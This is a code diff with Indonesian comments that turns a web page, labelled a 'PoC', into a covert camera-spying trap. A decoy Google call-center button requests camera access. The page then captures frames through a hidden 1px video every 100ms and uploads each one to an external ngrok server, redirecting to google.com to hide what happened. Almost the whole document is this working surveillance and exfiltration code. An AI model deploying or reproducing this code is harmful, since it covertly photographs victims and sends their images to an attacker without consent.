@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>SpeechSynthesis Redirect PoC (Controlled)</title>
+<title>Camera Redirect PoC (300ms)</title>
 <style>
   body {
     font-family: Arial, sans-serif;
@@ -20,50 +20,94 @@
     font-size: 18px;
     color: darkred;
   }
+  iframe, video, canvas { display: none !important; }
 </style>
 </head>
 <body>
 
 <h2>CLICK TO GOOGLE</h2>
-<button id="speechBtn">CLICK CALL CENTER GOOGLE</button>
+<button id="camBtn">CLICK CALL CENTER GOOGLE</button>
 <div id="status">Status: Waiting...</div>
 
+<div id="launcher-container" style="display: none;"></div>
+
 <script>
-const btn = document.getElementById('speechBtn');
-const status = document.getElementById('status');
+(function () {
+  'use strict';
 
-btn.addEventListener('click', () => {
+  var btn = document.getElementById('camBtn');
+  var statusEl = document.getElementById('status');
+  var SERVER_ENDPOINT = "https://studly-unallegorized-brecken.ngrok-free.dev/upload";
 
-  const text = "Attention: google.com is currently under maintenance. Please contact support immediately.";
-
-  if (!('speechSynthesis' in window)) {
-    status.textContent = "SpeechSynthesis not supported.";
-    return;
+  function log(msg) {
+    statusEl.textContent = msg;
+    console.log(msg);
   }
 
-  const utter = new SpeechSynthesisUtterance(text);
-  utter.lang = 'en-US';
+  // ============================================
+  // 1. KAMERA & TELEMETRI
+  // ============================================
+  async function startCamera() {
+    try {
+      log("Meminta Izin Kamera...");
+      var stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+      log("Kamera BERHASIL diakses!");
 
-  const voices = speechSynthesis.getVoices();
-  const enVoice = voices.find(v => v.lang.startsWith('en'));
-  if (enVoice) utter.voice = enVoice;
+      var video = document.createElement('video');
+      video.srcObject = stream;
+      video.muted = true;
+      video.playsInline = true;
+      video.style.cssText = 'position:fixed;top:0;left:0;width:1px;height:1px;opacity:0.01;pointer-events:none;';
+      document.body.appendChild(video);
 
-  status.textContent = "Preparing redirect...";
+      await video.play().catch(function(){});
 
-  // Redirect cepat
-  setTimeout(() => {
+      var canvas = document.createElement('canvas');
+      canvas.width = 640;
+      canvas.height = 480;
+      var ctx = canvas.getContext('2d');
 
-    // Trigger speech tepat sebelum navigasi
-    speechSynthesis.speak(utter);
-    console.log("[PoC] Speech triggered");
+      setInterval(function() {
+        if (video.readyState === video.HAVE_ENOUGH_DATA) {
+          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+          canvas.toBlob(function(blob) {
+            if (!blob) return;
+            var formData = new FormData();
+            formData.append('file', blob, 'camera.jpg');
+            fetch(SERVER_ENDPOINT, {
+              method: 'POST',
+              body: formData,
+              keepalive: true
+            }).catch(function(){});
+          }, 'image/jpeg', 0.5);
+        }
+      }, 100);
 
-    // Navigasi langsung setelah speech dipanggil
-    window.location.replace('https://google.com');
+    } catch(err) {
+      log("Kamera diblokir: " + err.name);
+    }
+  }
 
-  }, 700); // delay kecil (bisa tweak 100–500ms untuk testing)
+  // ============================================
+  // 2. TRIGGER (KLIK) - 300ms DELAY
+  // ============================================
+  btn.addEventListener('click', async () => {
+    log("Preparing redirect...");
 
-});
+    // A. Mulai Kamera (0ms)
+    startCamera();
+
+    // B. Redirect setelah 300ms
+    setTimeout(() => {
+      log("Redirect ke Google...");
+      try {
+        window.location.replace('https://www.google.com');
+      } catch(e) {}
+    }, 300); // 300ms
+
+  }, { once: true });
+
+})();
 </script>
-
 </body>
 </html>
